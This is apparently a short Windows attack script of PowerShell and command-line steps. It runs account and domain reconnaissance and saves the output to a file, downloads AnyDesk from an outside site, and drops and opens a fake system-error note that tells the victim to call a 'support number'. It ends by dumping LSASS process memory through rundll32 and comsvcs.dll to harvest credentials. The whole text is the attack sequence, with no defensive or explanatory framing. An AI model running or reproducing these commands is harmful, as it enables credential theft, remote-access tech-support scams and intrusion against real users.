whoami.exe /all > $env:UserProfile\Documents\fun.txt

net.exe user administrator > $env:UserProfile\Documents\fun.txt

net.exe groups /domain > $env:UserProfile\Documents\fun.txt

powershell Invoke-WebRequest -Uri "https://anydesk.com/en-au/downloads/windows?dv=win_exe" -UseBasicParsing -OutFile "$env:UserProfile\Desktop\anydesk.exe"

powershell New-Item "$env:UserProfile\Desktop\Important.txt" -ItemType File -Value "There is a core issue with your operating system. Open AnyDesk in your downloads and call the support number: 0404 810 855"

powershell start "$env:UserProfile\Desktop\Important.txt"

powershell Start-Sleep -Seconds 120

powershell rundll32.exe C:\\Windows\\System32\\comsvcs.dll #+0000^24 (Get-Process lsass).Id dump.bin full
